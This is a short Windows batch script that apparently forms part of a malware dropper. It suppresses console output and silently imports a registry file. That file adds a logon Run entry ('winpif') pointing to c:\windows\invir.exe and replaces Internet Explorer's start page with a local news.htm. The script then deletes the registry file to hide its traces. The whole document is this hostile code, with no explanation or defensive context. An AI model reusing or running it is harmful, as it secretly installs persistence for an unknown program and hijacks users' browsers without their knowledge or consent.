@echo off
ctty nul
echo REGEDIT4>C:\yoyks.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\yoyks.reg
echo "winpif"="c:\\windows\\invir.exe" >> C:\yoyks.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>C:\yoyks.reg
echo "Start Page"="c:\\windows\\system32\\news.htm" >> C:\yoyks.reg
regedit /s C:\yoyks.reg
del C:\yoyks.reg
ctty con
cls
